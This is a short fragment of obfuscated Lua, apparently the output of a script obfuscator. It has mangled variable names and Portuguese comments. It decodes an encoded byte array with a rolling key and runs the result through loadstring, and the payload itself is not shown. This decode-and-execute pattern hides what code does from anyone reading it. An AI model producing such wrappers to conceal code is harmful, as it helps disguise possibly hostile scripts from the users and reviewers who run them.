    local function VM_lIIOO1(d, k, m)
        local R_00lI = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_00lI, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_00lI)
    end

    -- Execution Guard
    local F_lIIl = loadstring(VM_lIIOO1(B_10l10l, 91, 5))
    if F_lIIl then
        F_lIIl(...)
    end
end)(...)
